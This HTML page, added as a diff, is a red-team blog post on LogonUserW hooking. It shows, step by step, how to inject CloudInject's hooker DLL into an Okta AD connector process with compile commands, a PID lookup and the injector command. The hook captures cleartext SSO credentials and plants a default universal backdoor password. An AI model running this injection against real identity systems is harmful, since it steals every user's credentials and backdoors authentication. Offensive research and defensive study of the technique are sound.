@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="RecapIAM Providers such as Azure AD (Entra ID), Okta, and OneLogin are vulnerable to a type of red team attack technique known as LogonUserW hooking. LogonUserW is an unmanaged Win32 API. Many IAM pro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking">
+<meta property="og:url" content="https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/index.html">
+<meta property="og:site_name" content="Zhong&#39;s Blog">
+<meta property="og:description" content="RecapIAM Providers such as Azure AD (Entra ID), Okta, and OneLogin are vulnerable to a type of red team attack technique known as LogonUserW hooking. LogonUserW is an unmanaged Win32 API. Many IAM pro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-24e5307b2c42b82d4dc92042d893346b.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-7dc94e9fc45d98a3cc468ec2be779df7.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-e8b366f9eb48556430a1188f2ca576c4.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-22d878a332b88f1d71aeb1a7aa5b8639.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-33c6e4aee949f7f3c70614d0198659c1.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-d398fa3144cd142bddfa2e0098026ac6.png">
+<meta property="article:published_time" content="2024-04-27T23:24:33.000Z">
+<meta property="article:modified_time" content="2024-04-27T23:32:46.067Z">
+<meta property="article:author" content="2h0ng, Zhong">
+<meta property="article:tag" content="SaaS Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-24e5307b2c42b82d4dc92042d893346b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-JRNNF9TMHE"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-JRNNF9TMHE');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/18/LACTF-2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&text=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&is_video=false&description=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking&body=Check out this article: https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&name=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&t=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Recap"><span class="toc-number">1.</span> <span class="toc-text">Recap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Requirements"><span class="toc-number">2.</span> <span class="toc-text">Requirements</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">3.1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tool"><span class="toc-number">3.2.</span> <span class="toc-text">Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steps-for-Exploiting-OKTA-AD-Connector"><span class="toc-number">3.3.</span> <span class="toc-text">Steps for Exploiting OKTA AD Connector:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">4.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">2h0ng, Zhong</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-27T23:24:33.000Z" class="dt-published" itemprop="datePublished">2024-04-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SaaS-Security/" rel="tag">SaaS Security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h1><p>IAM Providers such as Azure AD (Entra ID), Okta, and OneLogin are vulnerable to a type of red team attack technique known as <code>LogonUserW</code> hooking.</p>
+<p><code>LogonUserW</code> is an unmanaged Win32 API. Many IAM providers rely on this functionality to implement delegated authentication flows, which facilitate user implementation of SSO on the cloud without the need to upload all their domain credentials. This is achieved by delegating authentication to on-prem AD through their agent connectors running in the domain.</p>
+<p>However, despite the dependency of many IAM providers on this API to implement delegated authentication, there is an unavoidable flaw: all credentials passed to this API are in cleartext, which is originally found by <a target="_blank" rel="noopener" href="https://blog.xpnsec.com/azuread-connect-for-redteam/">@XPN</a>.</p>
+<p>Therefore, attackers can manage to hook <code>LogonUserW</code> to directly capture user’s cleartext credentials and even leave backdoors in the authentication flow.</p>
+<p>You can observe this behavior in <code>x64dbg</code> by attaching to the connector’s process and setting a breakpoint at <code>LoginUserW</code> in the <code>advapi32.dll</code>.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-24e5307b2c42b82d4dc92042d893346b.png" alt="Untitled"></p>
+<p>After you do that,  you can observe the cleartext credential when a user login attempt happens.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-7dc94e9fc45d98a3cc468ec2be779df7.png" alt="Untitled"></p>
+<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><ul>
+<li>Compromise a machine running an AD connector. Vulnerable AD connectors include:<ul>
+<li>Entra ID Connector with Pass-Through Authentication mode</li>
+<li>Okta AD Connector with Delegated Authentication mode</li>
+<li>OneLogin AD Connector</li>
+</ul>
+</li>
+<li>Ensure the controllable user running on the compromised machine has <code>SeDebugPrivilege</code>, which is typically owned by local administrators.</li>
+</ul>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>The risk is raised by the use of the unmanaged Win32 API <code>LogonUserW</code> across various IAM providers, and the method of exploitation remains the same regardless of the provider. Here, I will walk you through this attack using the case of Okta AD. </p>
+<h2 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a>Tool</h2><p>CloudInject: <a target="_blank" rel="noopener" href="https://github.com/xpn/CloudInject">https://github.com/xpn/CloudInject</a></p>
+<h2 id="Steps-for-Exploiting-OKTA-AD-Connector"><a href="#Steps-for-Exploiting-OKTA-AD-Connector" class="headerlink" title="Steps for Exploiting OKTA AD Connector:"></a>Steps for Exploiting OKTA AD Connector:</h2><ul>
+<li>Compile the <a target="_blank" rel="noopener" href="https://github.com/xpn/CloudInject">CloudInject</a> Ensure to place the hooker in a shared folder.</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-g++.exe .\Injector\injector.cpp -o .\Injector\injector.exe -<span class="type">static</span></span><br><span class="line">x86_64-w64-mingw32-g++.exe .\hooker\hooker.cpp -o C:\hooker.dll -<span class="type">static</span> -shared</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Locate the PID of <code>OktaAgentService.exe</code> .</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\cloudinject\CloudInject-main&gt; tasklist /FI  <span class="string">&quot;IMA</span></span><br><span class="line"><span class="string">GENAME eq OKTA*&quot;</span></span><br><span class="line"></span><br><span class="line">Image Name                     PID Session Name        Session#    Mem Usage</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">OktaAgentService.exe          <span class="number">6560</span> Services                   <span class="number">0</span>     <span class="number">56</span>,<span class="number">860</span> K</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Use <code>Injector.exe</code> to inject the <code>hooker.dll</code> into  <code>OktaAgentService.exe</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Injector\injector.exe <span class="number">6560</span> C:\hooker.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-e8b366f9eb48556430a1188f2ca576c4.png" alt="Untitled"></p>
+<ul>
+<li>Under okta’s <code>delegated authentication</code> mode, every login request through okta SSO is forwarded to on-prem AD. Once the hooker is successfully injected, it intercepts and captures the cleartext credential of every login attempt.</li>
+</ul>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-22d878a332b88f1d71aeb1a7aa5b8639.png" alt="Untitled"></p>
+<ul>
+<li>Furthermore, the hooker leaves a universal password backdoor, which is <code>OnePasswordToRuleThemAll!</code> by default:</li>
+</ul>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-33c6e4aee949f7f3c70614d0198659c1.png" alt="Untitled"></p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/04/27/19-26-52-d398fa3144cd142bddfa2e0098026ac6.png" alt="Untitled"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><strong>Conclusion</strong></h1><p>The exploitation of the <code>LogonUserW</code> API across various IAM platforms, including Azure AD, Okta, and OneLogin, highlights a significant and universal vulnerability within these systems. By capitalizing on this flaw, attackers are able to capture cleartext credentials and implant backdoors, threatening the integrity and security of delegated authentication processes.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Recap"><span class="toc-number">1.</span> <span class="toc-text">Recap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Requirements"><span class="toc-number">2.</span> <span class="toc-text">Requirements</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">3.1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tool"><span class="toc-number">3.2.</span> <span class="toc-text">Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steps-for-Exploiting-OKTA-AD-Connector"><span class="toc-number">3.3.</span> <span class="toc-text">Steps for Exploiting OKTA AD Connector:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">4.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&text=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&is_video=false&description=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking&body=Check out this article: https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&title=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&name=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2024/04/27/LogonUserW%20Hooking/&t=Offensive SaaS Security - Exfiltrating Cleartext Credentials via LogonUserW Hooking"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    2h0ng, Zhong
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zhong-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
